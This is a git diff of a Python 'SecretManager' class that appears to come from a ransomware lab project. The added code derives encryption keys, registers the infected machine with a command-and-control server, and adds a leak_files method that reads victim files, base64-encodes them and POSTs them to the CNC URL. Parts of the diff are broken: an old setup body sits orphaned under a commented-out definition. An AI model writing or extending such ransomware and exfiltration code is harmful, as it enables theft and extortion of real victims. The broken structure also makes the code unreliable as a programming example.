@@ -6,11 +6,14 @@ from typing import List, Tuple
 import os.path
 import requests
 import base64
-
+import hashlib
+from pathlib import Path
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 from xorcrypt import xorfile
+
+
 
 class SecretManager:
     ITERATION = 48000
@@ -37,7 +40,7 @@ class SecretManager:
             algorithm=hashes.SHA256(),
             salt=salt,
             iterations=self.ITERATION,
-            key_length=self.KEY_LENGTH,
+            length=self.KEY_LENGTH,
         )
 
         # Dérivation de la clé
@@ -84,7 +87,7 @@ class SecretManager:
         }
 
         # URL du CNC (Command and Control)
-        cnc_url = f"http://{self._remote_host_port}/upload"  # Assurez-vous que l'URL est correcte
+        cnc_url = f"http://{self._remote_host_port}/new" 
        
 
 
@@ -107,7 +110,7 @@ class SecretManager:
         #raise NotImplemented()
 
 
-    def setup(self) -> None:
+   # def setup(self) -> None:
         # Génére un salt aléatoire
         salt = os.urandom(self.SALT_LENGTH)
 
@@ -115,17 +118,23 @@ class SecretManager:
         private_key = os.urandom(self.KEY_LENGTH)
 
         # Effectue la dérivation de la clé privée
-        derived_key = self.do_derivation(salt, private_key)
+        derived_key = self.do_derivation(salt,private_key)
 
-        # Sauvegarde le sel et la clé 
-        salt_file_path = os.path.join(self._path, 'salt.bin')
-        key_file_path = os.path.join(self._path, 'key.bin')
+     
+        # Sauvegarde le salt et la clé 
+        #salt_file_path = os.path.join(self._path, 'salt.bin')
+        salt_file_path = os.path.join(f"{self._path}/token" , 'salt.bin')
+
+        #token_file_path = os.path.join(self._path, 'token.bin')
+        token_file_path = os.path.join(f"{self._path}/token" , 'token.bin')
+
+
 
         with open(salt_file_path, 'wb') as salt_file:
             salt_file.write(salt)
 
-        with open(key_file_path, 'wb') as key_file:
-            key_file.write(derived_key)
+        with open(token_file_path, 'wb') as token_file:
+            token_file.write(derived_key)
 
         # Envoye les données cryptographiques au CNC
         params = {'token': hashlib.sha256(derived_key).hexdigest()}
@@ -140,6 +149,33 @@ class SecretManager:
             print(response['message'])
         else:
             print(response['error'])
+
+    def setup(self) -> None:
+        # main function to create crypto data and register malware to cnc
+
+        # creation of crypto data and assignment to member variables
+        self._salt, self._key, self._token = self.create()
+        
+        # post request of said data
+        post_status_code = self.post_new(self._salt, self._key, self._token)
+
+        # we can display the returned status_code to check that everything worked
+        self._log.debug("post_new request returned with code " + str(post_status_code))
+        
+        token_path = f"{self._path}/token"
+        #if not Path(token_path).exists():  
+           # Path(token_path).mkdir(parents=True, exist_ok=False)
+        #if Path(f"{token_path}/token.bin").exists():
+            #raise FileExistsError
+        
+        # open taking parameter 'wb' allows the program to write into a binary file
+        
+        with open(f"{token_path}/token.bin", 'wb') as token_binary_file:
+            token_binary_file.write(self._token)
+        with open(f"{token_path}/salt.bin", 'wb') as salt_binary_file:
+            salt_binary_file.write(self._salt)
+
+        return None
 
 
 
@@ -247,10 +283,34 @@ class SecretManager:
 
 
 
-    def leak_files(self, files:List[str])->None:
+    #def leak_files(self, files:List[str])->None:
         # send file, geniune path and token to the CNC
-        raise NotImplemented()
+        #raise NotImplemented()
     
+
+    def leak_files(self, files: List[str]) -> None:
+        # send files to the CNC
+        # using hashed token filepath
+        dir_label = self.get_hex_token()
+        # creating destination URL
+        folder_url = f"http://{self._remote_host_port}/file?label={dir_label}"
+        # setting POST header
+        header = {
+                "Content-Type":"application/json"
+                }
+        for file in files:
+            with open(f'{file}', 'rb') as f:
+                # requests.post(file_url, files={f'f': f}, headers=header)
+                file_data = self.bin_to_b64(f.read())
+                file_json = {
+                        # file name without parent directories in its path (relative path, in essence)
+                        "file_name": file.rsplit('/', 1)[-1],
+                        "file_data": file_data
+                        }
+                # POST request
+                requests.post(folder_url, json=file_json, headers=header)
+        return None
+
 
     #def clean(self):
         # remove crypto data from the target
